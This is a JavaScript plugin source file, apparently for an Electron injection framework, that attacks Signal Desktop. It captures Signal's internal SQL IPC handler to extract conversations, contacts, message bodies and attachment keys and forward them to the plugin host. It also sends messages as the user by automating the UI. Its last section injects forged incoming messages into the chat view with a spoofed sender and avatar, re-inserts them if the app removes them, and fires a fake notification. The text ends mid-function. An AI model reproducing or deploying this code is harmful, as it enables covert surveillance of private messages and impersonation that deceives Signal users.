// Signal Interceptor — main.js
// Extracts conversations, messages, and attachments from Signal Desktop
// via its internal IPC database channel (sql-channel:read / sql-channel:write).
//
// Signal has contextIsolation:true + nodeIntegration:false, so require() is
// NOT available in the renderer's main world.  Instead we call the ipcMain
// handler directly from the main process — the plugin already runs there.

var bootstrapAttempts = 0;
var signalWindowId = null;
var conversations = [];      // Cached conversation list
var conversationMap = {};     // id -> conversation object
var contacts = [];            // Private conversations (1:1) = contacts
var injectedMessages = [];    // Track spoofed DOM messages
var dbReady = false;

// Reference to Signal's SQL read handler (captured from ipcMain)
var sqlReadHandler = null;

// ===== Capture the ipcMain SQL handler =====
// Signal registers ipcMain.handle('sql-channel:read', handler).
// We grab that handler so we can call it directly from the main process.

function captureSqlHandler() {
    var ipcMain = plugin.electron.ipcMain || plugin.require('electron').ipcMain;

    // Strategy 1: Access Electron's internal handler map
    // In Electron, ipcMain.handle() stores handlers in an internal Map.
    // The exact property name varies by version, but common ones are:
    // _invokeHandlers (older) or stored via EventEmitter pattern.
    if (ipcMain._invokeHandlers && ipcMain._invokeHandlers.has) {
        var handler = ipcMain._invokeHandlers.get('sql-channel:read');
        if (handler) {
            sqlReadHandler = handler;
            plugin.sendData('_debug', { fn: 'captureSqlHandler', status: 'ok', strategy: '_invokeHandlers' });
            return true;
        }
    }

    // Strategy 2: Try the internal handle store via different property names
    var candidates = ['_invokeHandlers', '_handlers', 'handlersMap'];
    for (var i = 0; i < candidates.length; i++) {
        var prop = candidates[i];
        var map = ipcMain[prop];
        if (map && typeof map.get === 'function') {
            var h = map.get('sql-channel:read');
            if (h) {
                sqlReadHandler = h;
                plugin.sendData('_debug', { fn: 'captureSqlHandler', status: 'ok', strategy: prop });
                return true;
            }
        }
        if (map && typeof map === 'object' && map['sql-channel:read']) {
            sqlReadHandler = map['sql-channel:read'];
            plugin.sendData('_debug', { fn: 'captureSqlHandler', status: 'ok', strategy: prop + '_obj' });
            return true;
        }
    }

    // Strategy 3: Enumerate all own and prototype properties to find the handler map
    var allProps = [];
    try {
        allProps = Object.getOwnPropertyNames(ipcMain);
        var proto = Object.getPrototypeOf(ipcMain);
        if (proto) allProps = allProps.concat(Object.getOwnPropertyNames(proto));
    } catch (e) {}

    for (var p = 0; p < allProps.length; p++) {
        try {
            var val = ipcMain[allProps[p]];
            if (val && typeof val === 'object' && typeof val.get === 'function') {
                var h2 = val.get('sql-channel:read');
                if (h2 && typeof h2 === 'function') {
                    sqlReadHandler = h2;
                    plugin.sendData('_debug', { fn: 'captureSqlHandler', status: 'ok', strategy: 'scan:' + allProps[p] });
                    return true;
                }
            }
        } catch (e) {}
    }

    // Report what we found for debugging
    plugin.sendData('_debug', {
        fn: 'captureSqlHandler',
        status: 'fail',
        ipcMainProps: allProps.slice(0, 30),
        ipcMainType: typeof ipcMain,
        hasInvokeHandlers: !!ipcMain._invokeHandlers
    });
    return false;
}

// ===== Signal DB query via main-process ipcMain handler =====

function querySignalDB(method, args) {
    if (!sqlReadHandler) {
        return Promise.reject(new Error('SQL handler not captured'));
    }

    // The handler signature is: handler(event, callName, ...args)
    // We create a fake IPC event object
    var fakeEvent = { sender: null, frameId: 0, processId: 0 };

    try {
        // Call the handler with spread args (matching how Signal's ipcSqlReadHandler works)
        // Signal's handler: function ipcSqlReadHandler(_event, callName, ...args)
        // The handler is wrapped by wrapResult which returns {ok, value} or {ok, error}
        var argsToSpread = [fakeEvent, method];
        if (args && args.length > 0) {
            for (var i = 0; i < args.length; i++) {
                argsToSpread.push(args[i]);
            }
        }
        var result = sqlReadHandler.apply(null, argsToSpread);

        // The handler returns a Promise (wrapped by wrapResult)
        if (result && typeof result.then === 'function') {
            return result.then(function(wrapped) {
                if (wrapped && wrapped.ok === true) return wrapped.value;
                if (wrapped && wrapped.ok === false) {
                    plugin.sendData('_error', { phase: 'db_query', method: method, error: String(wrapped.error) });
                    return null;
                }
                return wrapped;
            });
        }

        // Synchronous result
        if (result && result.ok === true) return Promise.resolve(result.value);
        if (result && result.ok === false) {
            plugin.sendData('_error', { phase: 'db_query', method: method, error: String(result.error) });
            return Promise.resolve(null);
        }
        return Promise.resolve(result);
    } catch (e) {
        plugin.sendData('_error', { phase: 'db_query', method: method, error: 'call_error: ' + String(e) });
        return Promise.resolve(null);
    }
}

// Fallback: use webContents IPC invoke (triggers the same ipcMain handler)
// This works because webContents.mainFrame can invoke ipcMain handlers
function querySignalDBViaIPC(method, args) {
    if (!signalWindowId) {
        return Promise.reject(new Error('No Signal window'));
    }

    // Get the actual webContents from tracked windows
    var BrowserWindow = plugin.electron.BrowserWindow;
    var allWindows = BrowserWindow.getAllWindows();
    var wc = null;

    for (var i = 0; i < allWindows.length; i++) {
        try {
            if (allWindows[i].webContents && !allWindows[i].webContents.isDestroyed()) {
                if (allWindows[i].webContents.id === signalWindowId) {
                    wc = allWindows[i].webContents;
                    break;
                }
            }
        } catch (e) {}
    }

    if (!wc) {
        // Try first available window
        for (var j = 0; j < allWindows.length; j++) {
            try {
                if (allWindows[j].webContents && !allWindows[j].webContents.isDestroyed()) {
                    wc = allWindows[j].webContents;
                    break;
                }
            } catch (e) {}
        }
    }

    if (!wc) {
        return Promise.reject(new Error('No webContents available'));
    }

    // Use webContents to invoke the IPC handler from the renderer side
    // The preload context has access to ipcRenderer — we need to run code there.
    // But executeJavaScript runs in the main world, not the preload world.
    // So instead, use the webContents internal IPC mechanism.

    // Electron internal: webContents._send / webContents._sendInternal
    // Or we can use webContents.mainFrame (available in newer Electron)
    // to call executeJavaScriptInIsolatedWorld (preload world = world 999)

    // Strategy: Use webFrame's isolated world execution
    // Electron's contextIsolation uses world ID 999 for the preload
    var code =
        '(function() {' +
        '  try {' +
        '    var ipcRenderer = require("electron").ipcRenderer;' +
        '    var method = ' + JSON.stringify(method) + ';' +
        '    var args = ' + JSON.stringify(args || []) + ';' +
        '    var invokeArgs = ["sql-channel:read", method].concat(args);' +
        '    return ipcRenderer.invoke.apply(ipcRenderer, invokeArgs)' +
        '      .then(function(r) { return JSON.stringify(r); })' +
        '      .catch(function(e) { return JSON.stringify({ok:false,error:String(e)}); });' +
        '  } catch(e) { return JSON.stringify({ok:false,error:String(e)}); }' +
        '})()';

    // Try executeJavaScriptInIsolatedWorld if available (preload = world 999)
    if (wc.mainFrame && typeof wc.mainFrame.executeJavaScriptInIsolatedWorld === 'function') {
        return wc.mainFrame.executeJavaScriptInIsolatedWorld(999, [{ code: code }])
            .then(function(raw) {
                if (!raw) return null;
                try {
                    var result = JSON.parse(raw);
                    if (result && result.ok === true) return result.value;
                    if (result && result.ok === false) {
                        plugin.sendData('_error', { phase: 'db_ipc', method: method, error: result.error });
                        return null;
                    }
                    return result;
                } catch (e) { return null; }
            })
            .catch(function(e) {
                plugin.sendData('_error', { phase: 'db_ipc', method: method, error: 'isolated_exec: ' + String(e) });
                return null;
            });
    }

    // Fallback: try _executeJavaScript with world isolation
    if (typeof wc._executeJavaScript === 'function') {
        return wc._executeJavaScript(code, false, null, 999)
            .then(function(raw) {
                if (!raw) return null;
                try {
                    var result = JSON.parse(raw);
                    if (result && result.ok === true) return result.value;
                    if (result && result.ok === false) return null;
                    return result;
                } catch (e) { return null; }
            })
            .catch(function() { return null; });
    }

    return Promise.reject(new Error('No isolated world execution available'));
}

// Combined query: try direct handler first, then IPC fallback
function queryDB(method, args) {
    if (sqlReadHandler) {
        return querySignalDB(method, args).then(function(result) {
            if (result !== null && result !== undefined) return result;
            // Handler returned null, try IPC fallback
            return querySignalDBViaIPC(method, args).catch(function() { return null; });
        }).catch(function() {
            return querySignalDBViaIPC(method, args).catch(function() { return null; });
        });
    }
    return querySignalDBViaIPC(method, args);
}

// ===== Find Signal's renderer window =====

function findSignalWindow() {
    var windows = plugin.getWindows();
    if (windows.length === 0) return null;

    for (var i = 0; i < windows.length; i++) {
        var w = windows[i];
        var title = (w.title || '').toLowerCase();
        var url = (w.url || '').toLowerCase();
        if (title.indexOf('signal') !== -1 || url.indexOf('signal') !== -1 || url.indexOf('background.html') !== -1) {
            return w.id;
        }
    }

    return windows[0].id;
}

// ===== Test DB access =====

function testDBAccess() {
    return queryDB('getAllConversations', []).then(function(result) {
        if (result && Array.isArray(result)) {
            dbReady = true;
            plugin.sendData('_debug', { fn: 'testDBAccess', status: 'ok', conversationCount: result.length });
            return true;
        }
        if (result && typeof result === 'object' && !Array.isArray(result)) {
            dbReady = true;
            plugin.sendData('_debug', { fn: 'testDBAccess', status: 'ok_object', keys: Object.keys(result).slice(0, 10) });
            return true;
        }
        plugin.sendData('_debug', { fn: 'testDBAccess', status: 'fail', resultType: typeof result, result: String(result).substring(0, 200) });
        return false;
    }).catch(function(e) {
        plugin.sendData('_debug', { fn: 'testDBAccess', status: 'error', error: String(e) });
        return false;
    });
}

// ===== Data fetching =====

function fetchConversations() {
    return queryDB('getAllConversations', []).then(function(result) {
        if (!result) {
            plugin.sendData('_error', { phase: 'fetch_conversations', error: 'No result from getAllConversations' });
            return;
        }

        var convos = Array.isArray(result) ? result : [];
        conversations = [];
        contacts = [];
        conversationMap = {};

        for (var i = 0; i < convos.length; i++) {
            var c = convos[i];
            var conv = c;
            if (typeof c === 'string') {
                try { conv = JSON.parse(c); } catch (e) { continue; }
            }
            if (c.json && typeof c.json === 'string') {
                try { conv = JSON.parse(c.json); } catch (e) { conv = c; }
            }

            var id = conv.id || conv.serviceId || '';
            if (!id) continue;

            var name = conv.name || conv.profileName || conv.profileFullName || conv.e164 || id;
            var type = conv.type === 'group' ? 'group' : 'private';
            var lastMessage = '';
            var lastActivity = conv.active_at || conv.activeAt || 0;

            if (conv.lastMessage) {
                lastMessage = typeof conv.lastMessage === 'string' ? conv.lastMessage : (conv.lastMessage.body || '');
            }

            var members = [];
            if (conv.membersV2 && Array.isArray(conv.membersV2)) {
                for (var m = 0; m < conv.membersV2.length; m++) {
                    members.push(conv.membersV2[m].aci || conv.membersV2[m].serviceId || '');
                }
            } else if (conv.members && Array.isArray(conv.members)) {
                members = conv.members;
            }

            var simplified = {
                id: id,
                name: name,
                type: type,
                lastMessage: lastMessage.substring(0, 100),
                lastActivity: lastActivity,
                members: members,
                profileAvatar: conv.profileAvatar || conv.avatar || null,
                e164: conv.e164 || '',
                serviceId: conv.serviceId || '',
                groupId: conv.groupId || ''
            };

            conversations.push(simplified);
            conversationMap[id] = simplified;
            // Also index by serviceId and e164 so we can resolve sender names
            // (messages use serviceId as the source field)
            if (conv.serviceId) conversationMap[conv.serviceId] = simplified;
            if (conv.e164) conversationMap[conv.e164] = simplified;

            if (type === 'private') {
                contacts.push(simplified);
            }
        }

        conversations.sort(function(a, b) { return (b.lastActivity || 0) - (a.lastActivity || 0); });
        contacts.sort(function(a, b) { return (b.lastActivity || 0) - (a.lastActivity || 0); });

        plugin.sendData('conversations', { conversations: conversations, count: conversations.length });
        plugin.sendData('contact_list', { contacts: contacts, count: contacts.length });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'fetch_conversations', error: String(e) });
    });
}

function fetchMessages(conversationId, conversationName, options) {
    var limit = (options && options.limit) || 50;
    // Signal's getOlderMessagesByConversation expects a SINGLE options object
    // with conversationId inside it: { conversationId, limit, ... }
    // Must explicitly set optional fields to null (not undefined) because
    // Signal's sqlFragment pushes raw values to SQLite params, and SQLite
    // cannot bind undefined — only null.
    var queryOpts = {
        conversationId: conversationId,
        limit: limit,
        messageId: (options && options.messageId) || null,
        receivedAt: (options && options.receivedAt) || Number.MAX_VALUE,
        sentAt: (options && options.sentAt) || Number.MAX_VALUE,
        storyId: null,
        includeStoryReplies: false,
        requireVisualMediaAttachments: false,
        requireFileAttachments: false
    };

    return queryDB('getOlderMessagesByConversation', [queryOpts]).then(function(result) {
        if (!result) {
            plugin.sendData('_error', { phase: 'fetch_messages', conversationId: conversationId, error: 'No result' });
            return;
        }

        var msgs = Array.isArray(result) ? result : (result.messages || []);
        var formatted = [];

        for (var i = 0; i < msgs.length; i++) {
            var msg = msgs[i];
            if (typeof msg === 'string') {
                try { msg = JSON.parse(msg); } catch (e) { continue; }
            }
            if (msg.json && typeof msg.json === 'string') {
                try { msg = JSON.parse(msg.json); } catch (e) { msg = msgs[i]; }
            }

            var body = msg.body || '';
            var timestamp = msg.sent_at || msg.received_at || msg.timestamp || 0;
            var source = msg.source || msg.sourceServiceId || '';
            var type = msg.type || '';

            var senderName = source;
            if (type === 'outgoing') {
                senderName = 'You';
            } else if (conversationMap[source]) {
                senderName = conversationMap[source].name || source;
            } else if (msg.sourceServiceId && conversationMap[msg.sourceServiceId]) {
                senderName = conversationMap[msg.sourceServiceId].name || source;
            } else if (msg.source && conversationMap[msg.source]) {
                senderName = conversationMap[msg.source].name || source;
            }

            var attachments = [];
            if (msg.attachments && Array.isArray(msg.attachments)) {
                for (var a = 0; a < msg.attachments.length; a++) {
                    var att = msg.attachments[a];
                    attachments.push({
                        contentType: att.contentType || att.content_type || '',
                        fileName: att.fileName || att.filename || 'attachment',
                        size: att.size || 0,
                        path: att.path || '',
                        localKey: att.localKey || '',
                        width: att.width || 0,
                        height: att.height || 0
                    });
                }
            }

            formatted.push({
                id: msg.id || '',
                conversationId: conversationId,
                body: body,
                timestamp: timestamp,
                time: timestamp ? new Date(timestamp).toISOString() : '',
                source: source,
                senderName: senderName,
                type: type,
                hasAttachments: attachments.length > 0,
                attachments: attachments
            });
        }

        formatted.sort(function(a, b) { return (a.timestamp || 0) - (b.timestamp || 0); });

        var convName = conversationName;
        if (!convName && conversationMap[conversationId]) {
            convName = conversationMap[conversationId].name;
        }

        plugin.sendData('messages', {
            conversationId: conversationId,
            conversationName: convName || conversationId,
            messages: formatted,
            count: formatted.length
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'fetch_messages', conversationId: conversationId, error: String(e) });
    });
}

function searchMessages(query) {
    return queryDB('searchMessages', [{ query: query }]).then(function(result) {
        if (!result) {
            plugin.sendData('search_results', { query: query, matches: [], total: 0, error: 'No result' });
            return;
        }

        var msgs = Array.isArray(result) ? result : (result.messages || []);
        var formatted = [];

        for (var i = 0; i < msgs.length; i++) {
            var msg = msgs[i];
            if (typeof msg === 'string') {
                try { msg = JSON.parse(msg); } catch (e) { continue; }
            }
            if (msg.json && typeof msg.json === 'string') {
                try { msg = JSON.parse(msg.json); } catch (e) { msg = msgs[i]; }
            }

            var convId = msg.conversationId || '';
            var convName = '';
            if (conversationMap[convId]) {
                convName = conversationMap[convId].name || convId;
            }

            var source = msg.source || msg.sourceServiceId || '';
            var senderName = source;
            if (msg.type === 'outgoing') {
                senderName = 'You';
            } else if (conversationMap[source]) {
                senderName = conversationMap[source].name || source;
            } else if (msg.sourceServiceId && conversationMap[msg.sourceServiceId]) {
                senderName = conversationMap[msg.sourceServiceId].name || source;
            } else if (msg.source && conversationMap[msg.source]) {
                senderName = conversationMap[msg.source].name || source;
            }

            formatted.push({
                id: msg.id || '',
                body: msg.body || '',
                timestamp: msg.sent_at || msg.received_at || msg.timestamp || 0,
                time: (msg.sent_at || msg.received_at) ? new Date(msg.sent_at || msg.received_at).toISOString() : '',
                source: source,
                senderName: senderName,
                conversationId: convId,
                conversationName: convName
            });
        }

        plugin.sendData('search_results', {
            query: query,
            matches: formatted,
            total: formatted.length
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'search', query: query, error: String(e) });
        plugin.sendData('search_results', { query: query, matches: [], total: 0, error: String(e) });
    });
}

// ===== Send message via UI automation =====

function sendMessage(conversationId, text) {
    if (!signalWindowId) {
        plugin.sendData('send_result', { conversationId: conversationId, ok: false, error: 'No Signal window' });
        return Promise.resolve();
    }

    var safeText = JSON.stringify(text || '');
    var safeConvId = JSON.stringify(conversationId || '');

    // Step 1: Click the conversation in Signal's sidebar to open it
    var convName = '';
    var convServiceId = '';
    var convGroupId = '';
    if (conversationMap[conversationId]) {
        convName = conversationMap[conversationId].name || '';
        convServiceId = conversationMap[conversationId].serviceId || '';
        convGroupId = conversationMap[conversationId].groupId || '';
    }
    var safeConvName = JSON.stringify(convName);
    var safeServiceId = JSON.stringify(convServiceId);
    var safeGroupId = JSON.stringify(convGroupId);

    var openCode =
        '(function() {' +
        '  var convId = ' + safeConvId + ';' +
        '  var convName = ' + safeConvName + ';' +
        '  var serviceId = ' + safeServiceId + ';' +
        '  var groupId = ' + safeGroupId + ';' +
        // Strategy 1: data-testid with conversation ID
        '  var btn = document.querySelector("[data-testid=\\"" + convId + "\\"]");' +
        '  if (btn) { btn.click(); return "opened_testid"; }' +
        // Strategy 2: data-testid with serviceId (private DMs may use this)
        '  if (serviceId && serviceId !== convId) {' +
        '    btn = document.querySelector("[data-testid=\\"" + serviceId + "\\"]");' +
        '    if (btn) { btn.click(); return "opened_serviceId"; }' +
        '  }' +
        // Strategy 3: data-testid with groupId
        '  if (groupId && groupId !== convId) {' +
        '    btn = document.querySelector("[data-testid=\\"" + groupId + "\\"]");' +
        '    if (btn) { btn.click(); return "opened_groupId"; }' +
        '  }' +
        // Strategy 4: conversation-list class buttons matching name
        '  if (convName) {' +
        '    var clBtns = document.querySelectorAll("button[class*=\\"conversation-list\\"]");' +
        '    for (var i = 0; i < clBtns.length; i++) {' +
        '      var label = clBtns[i].getAttribute("aria-label") || "";' +
        '      if (label.indexOf(convName) !== -1) { clBtns[i].click(); return "opened_class"; }' +
        '    }' +
        // Strategy 5: any button with "Chat with" + name in aria-label
        '    var allBtns = document.querySelectorAll("button");' +
        '    for (var j = 0; j < allBtns.length; j++) {' +
        '      var lbl = allBtns[j].getAttribute("aria-label") || "";' +
        '      if (lbl.indexOf("Chat with") !== -1 && lbl.indexOf(convName) !== -1) {' +
        '        allBtns[j].click(); return "opened_aria";' +
        '      }' +
        '    }' +
        // Strategy 6: any button whose aria-label contains name within sidebar area
        '    for (var k = 0; k < allBtns.length; k++) {' +
        '      var lbl2 = allBtns[k].getAttribute("aria-label") || "";' +
        '      if (lbl2.length > 0 && lbl2.indexOf(convName) !== -1 && allBtns[k].closest("[class*=\\"conversation-list\\"], [class*=\\"LeftPane\\"], [class*=\\"left-pane\\"], nav")) {' +
        '        allBtns[k].click(); return "opened_name_broad";' +
        '      }' +
        '    }' +
        '  }' +
        '  return "conv_not_found:" + convName;' +
        '})()';

    return plugin.executeInRenderer(signalWindowId, openCode).then(function(openResult) {
        if (openResult && openResult.indexOf('conv_not_found') === 0) {
            plugin.sendData('_error', { phase: 'send_message', error: 'Could not find conversation in Signal sidebar. name=' + convName + ' id=' + conversationId + ' serviceId=' + convServiceId });
            return;
        }
        // Conversation opened successfully

        // Step 2: Wait for compose area to render, then type and send
        return new Promise(function(resolve) {
            plugin.setTimeout(function() { resolve(); }, 1500);
        }).then(function() {
            // Run DOM discovery + send in one shot
            var sendCode =
                '(function() {' +
                '  var text = ' + safeText + ';' +
                '  var convId = ' + safeConvId + ';' +
                '  var result = { conversationId: convId, ok: false, error: null, strategy: null };' +
                // Try various selectors for the compose input
                '  var editor = document.querySelector("[contenteditable=\\"true\\"][role=\\"textbox\\"]") ||' +
                '    document.querySelector("[contenteditable=\\"true\\"]") ||' +
                '    document.querySelector(".ql-editor") ||' +
                '    document.querySelector("[data-testid=\\"CompositionInput\\"] [contenteditable]") ||' +
                '    document.querySelector("textarea");' +
                '  if (!editor) {' +
                '    var editables = document.querySelectorAll("[contenteditable]");' +
                '    var info = [];' +
                '    editables.forEach(function(e) { info.push(e.tagName + "." + e.className.substring(0,40)); });' +
                '    result.error = "Compose not found. editables=" + info.join("; ") + " textareas=" + document.querySelectorAll("textarea").length;' +
                '    return JSON.stringify(result);' +
                '  }' +
                '  try {' +
                '    editor.focus();' +
                // Use execCommand for React-compatible input
                '    document.execCommand("selectAll", false, null);' +
                '    document.execCommand("insertText", false, text);' +
                // Also try direct input for safety
                '    if (!editor.textContent || editor.textContent.trim().length === 0) {' +
                '      editor.textContent = text;' +
                '      editor.dispatchEvent(new Event("input", { bubbles: true }));' +
                '    }' +
                // Small delay then find send button
                '    setTimeout(function() {' +
                '      var sendBtn = document.querySelector("[data-testid=\\"send-button\\"]") ||' +
                '        document.querySelector("button[aria-label=\\"Send\\"]") ||' +
                '        document.querySelector("button[aria-label=\\"Send message\\"]");' +
                '      if (!sendBtn) {' +
                '        var buttons = document.querySelectorAll("button");' +
                '        for (var b = 0; b < buttons.length; b++) {' +
                '          var label = (buttons[b].getAttribute("aria-label") || "").toLowerCase();' +
                '          if (label.indexOf("send") !== -1) { sendBtn = buttons[b]; break; }' +
                '        }' +
                '      }' +
                '      if (sendBtn) { sendBtn.click(); }' +
                '      else { editor.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", code: "Enter", keyCode: 13, bubbles: true, which: 13 })); }' +
                '    }, 300);' +
                '    result.ok = true; result.strategy = "open_then_compose";' +
                '  } catch(e) { result.error = "send_ui: " + String(e); }' +
                '  return JSON.stringify(result);' +
                '})()';

            return plugin.executeInRenderer(signalWindowId, sendCode).then(function(raw) {
                try {
                    var data = JSON.parse(raw);
                    plugin.sendData('send_result', data);
                    if (data.ok) {
                        plugin.setTimeout(function() {
                            fetchMessages(conversationId, null, { limit: 50 });
                        }, 3000);
                    } else {
                        plugin.sendData('_error', { phase: 'send_message', error: data.error || 'Send failed' });
                    }
                } catch (e) {
                    plugin.sendData('_error', { phase: 'send_message', error: 'Parse error: ' + String(e) + ' raw=' + String(raw).substring(0, 200) });
                }
            });
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'send_message', error: 'executeInRenderer: ' + String(e) });
    });
}

// ===== Inject fake message into UI =====

function injectFakeMessage(conversationId, senderName, text) {
    if (!signalWindowId) {
        plugin.sendData('inject_result', { conversationId: conversationId, success: false, error: 'No Signal window' });
        return Promise.resolve();
    }

    var safeText = JSON.stringify(text || '');
    var safeName = JSON.stringify(senderName || 'Unknown');
    var safeConvId = JSON.stringify(conversationId || '');

    // First open the conversation in Signal's UI
    var convName = '';
    var convServiceId = '';
    var convGroupId = '';
    if (conversationMap[conversationId]) {
        convName = conversationMap[conversationId].name || '';
        convServiceId = conversationMap[conversationId].serviceId || '';
        convGroupId = conversationMap[conversationId].groupId || '';
    }
    var safeConvName = JSON.stringify(convName);
    var safeServiceId = JSON.stringify(convServiceId);
    var safeGroupId = JSON.stringify(convGroupId);

    var openCode =
        '(function() {' +
        '  var convId = ' + safeConvId + ';' +
        '  var convName = ' + safeConvName + ';' +
        '  var serviceId = ' + safeServiceId + ';' +
        '  var groupId = ' + safeGroupId + ';' +
        // Strategy 1: data-testid with conversation ID
        '  var btn = document.querySelector("[data-testid=\\"" + convId + "\\"]");' +
        '  if (btn) { btn.click(); return "opened_testid"; }' +
        // Strategy 2: data-testid with serviceId (private DMs may use this)
        '  if (serviceId && serviceId !== convId) {' +
        '    btn = document.querySelector("[data-testid=\\"" + serviceId + "\\"]");' +
        '    if (btn) { btn.click(); return "opened_serviceId"; }' +
        '  }' +
        // Strategy 3: data-testid with groupId
        '  if (groupId && groupId !== convId) {' +
        '    btn = document.querySelector("[data-testid=\\"" + groupId + "\\"]");' +
        '    if (btn) { btn.click(); return "opened_groupId"; }' +
        '  }' +
        // Strategy 4: conversation-list class buttons matching name
        '  if (convName) {' +
        '    var clBtns = document.querySelectorAll("button[class*=\\"conversation-list\\"]");' +
        '    for (var i = 0; i < clBtns.length; i++) {' +
        '      var label = clBtns[i].getAttribute("aria-label") || "";' +
        '      if (label.indexOf(convName) !== -1) { clBtns[i].click(); return "opened_class"; }' +
        '    }' +
        // Strategy 5: any button with "Chat with" + name in aria-label
        '    var allBtns = document.querySelectorAll("button");' +
        '    for (var j = 0; j < allBtns.length; j++) {' +
        '      var lbl = allBtns[j].getAttribute("aria-label") || "";' +
        '      if (lbl.indexOf("Chat with") !== -1 && lbl.indexOf(convName) !== -1) {' +
        '        allBtns[j].click(); return "opened_aria";' +
        '      }' +
        '    }' +
        // Strategy 6: any button whose aria-label starts with or contains name
        // (DMs may not use "Chat with" prefix)
        '    for (var k = 0; k < allBtns.length; k++) {' +
        '      var lbl2 = allBtns[k].getAttribute("aria-label") || "";' +
        '      if (lbl2.length > 0 && lbl2.indexOf(convName) !== -1 && allBtns[k].closest("[class*=\\"conversation-list\\"], [class*=\\"LeftPane\\"], [class*=\\"left-pane\\"], nav")) {' +
        '        allBtns[k].click(); return "opened_name_broad";' +
        '      }' +
        '    }' +
        '  }' +
        '  return "not_found";' +
        '})()';

    return plugin.executeInRenderer(signalWindowId, openCode).then(function(openResult) {
        if (openResult === 'not_found') {
            plugin.sendData('_error', { phase: 'inject', error: 'Could not open conversation in Signal UI. name=' + convName + ' id=' + conversationId + ' serviceId=' + convServiceId });
            plugin.sendData('inject_result', { conversationId: conversationId, success: false, error: 'Conversation not found in sidebar' });
            return;
        }

        // Wait for conversation to render
        return new Promise(function(resolve) {
            plugin.setTimeout(function() { resolve(); }, 1500);
        }).then(function() {
            // Clone an existing incoming message and replace text/sender
            // Signal message structure:
            //   .module-timeline__messages > [role=listitem] > .module-message__wrapper > .module-message--incoming
            //     .module-message__author .module-contact-name = sender name
            //     .module-message__text = <span><span>body text</span></span>
            //     .module-quote__container = quoted reply (remove from clone)
            var injectCode = [
                '(function() {',
                '  try {',
                '  var senderName = ' + safeName + ';',
                '  var text = ' + safeText + ';',
                '  var convId = ' + safeConvId + ';',
                '  var result = { conversationId: convId, success: false, error: null };',
                // Find the message list
                '  var msgList = document.querySelector(".module-timeline__messages");',
                '  if (!msgList) { result.error = "module-timeline__messages not found"; return JSON.stringify(result); }',
                // Find an incoming message to clone
                '  var sourceMsg = null;',
                '  var items = msgList.querySelectorAll(".module-message--incoming");',
                '  if (items.length > 0) sourceMsg = items[items.length - 1];',
                '  if (!sourceMsg) { result.error = "No incoming message to clone"; return JSON.stringify(result); }',
                // Walk up to the listitem wrapper (the full message row)
                '  var listItem = sourceMsg;',
                '  while (listItem && listItem !== msgList && listItem.getAttribute("role") !== "listitem") {',
                '    listItem = listItem.parentElement;',
                '  }',
                '  if (!listItem || listItem === msgList) listItem = sourceMsg.parentElement.parentElement;',
                // Clone the full message row
                '  var clone = listItem.cloneNode(true);',
                '  clone.setAttribute("data-jstap-injected", "true");',
                '  clone.removeAttribute("id");',
                '  clone.removeAttribute("data-message-id");',
                '  clone.removeAttribute("data-item-index");',
                // Remove quoted reply if present
                '  var quotes = clone.querySelectorAll(".module-quote__container");',
                '  quotes.forEach(function(q) { q.remove(); });',
                // Remove reactions
                '  var reactions = clone.querySelectorAll("[class*=reaction]");',
                '  reactions.forEach(function(r) { r.remove(); });',
                // Replace sender name
                '  var authorEl = clone.querySelector(".module-message__author .module-contact-name");',
                '  if (authorEl) authorEl.textContent = senderName;',
                // Also update the avatar aria-label
                '  var avatarEl = clone.querySelector(".module-Avatar");',
                '  if (avatarEl) {',
                '    avatarEl.setAttribute("aria-label", "Avatar for contact " + senderName);',
                '    var avatarLabel = avatarEl.querySelector(".module-Avatar__label");',
                '    if (avatarLabel) {',
                '      var initials = senderName.split(" ").map(function(w) { return w.charAt(0); }).join("").substring(0, 2).toUpperCase();',
                '      avatarLabel.textContent = initials;',
                '    }',
                '  }',
                // Replace message body text — only replace the text spans, preserve timestamp spacer
                '  var bodyEl = clone.querySelector(".module-message__text");',
                '  if (bodyEl) {',
                '    var textSpan = bodyEl.querySelector("span > span");',
                '    if (textSpan) {',
                '      textSpan.textContent = text;',
                '    } else {',
                '      var firstSpan = bodyEl.querySelector("span");',
                '      if (firstSpan) firstSpan.textContent = text;',
                '      else bodyEl.insertAdjacentHTML("afterbegin", "<span><span>" + text.replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</span></span>");',
                '    }',
                '  }',
                // Update accessibility id to avoid conflicts
                '  var accEls = clone.querySelectorAll("[id]");',
                '  accEls.forEach(function(el) { el.removeAttribute("id"); });',
                '  var labelledEls = clone.querySelectorAll("[aria-labelledby]");',
                '  labelledEls.forEach(function(el) { el.removeAttribute("aria-labelledby"); });',
                // Insert before the bottom detector
                '  var detector = msgList.querySelector(".module-timeline__messages__at-bottom-detector");',
                '  if (detector) {',
                '    msgList.insertBefore(clone, detector);',
                '  } else {',
                '    msgList.appendChild(clone);',
                '  }',
                '  clone.scrollIntoView({ behavior: "smooth", block: "end" });',
                // MutationObserver to re-inject if React removes it
                '  var html = clone.outerHTML;',
                '  var observer = new MutationObserver(function() {',
                '    if (!document.contains(clone)) {',
                '      var target = document.querySelector(".module-timeline__messages");',
                '      if (target) {',
                '        var det = target.querySelector(".module-timeline__messages__at-bottom-detector");',
                '        var temp = document.createElement("div");',
                '        temp.innerHTML = html;',
                '        var restored = temp.firstChild;',
                '        if (det) target.insertBefore(restored, det);',
                '        else target.appendChild(restored);',
                '        clone = restored;',
                '      }',
                '    }',
                '  });',
                '  observer.observe(msgList.parentElement || document.body, { childList: true, subtree: true });',
                '  window.__jstapInjectedObservers = window.__jstapInjectedObservers || [];',
                '  window.__jstapInjectedObservers.push(observer);',
                // Fire a system notification to sell the spoof
                '  try {',
                '    var notifBody = text.length > 100 ? text.substring(0, 97) + "..." : text;',
                '    new Notification(senderName, { body: notifBody, silent: false });',
                '  } catch(ne) {}',
                '  result.success = true;',
                '  result.strategy = "clone_native";',
                '  } catch(e) { result.error = "inject: " + String(e); }',
                '  return JSON.stringify(result);',
                '})()'
            ].join('\n');

            return plugin.executeInRenderer(signalWindowId, injectCode).then(function(raw) {
                try {
                    var data = JSON.parse(raw);
                    if (data.success) {
                        injectedMessages.push({
                            conversationId: conversationId,
                            senderName: senderName,
                            text: (text || '').substring(0, 100),
                            time: new Date().toISOString()
                        });
                        plugin.sendData('injected_messages', { messages: injectedMessages, count: injectedMessages.length });
                    } else {
                        plugin.sendData('_error', { phase: 'inject', error: data.error || 'Inject failed' });
                    }
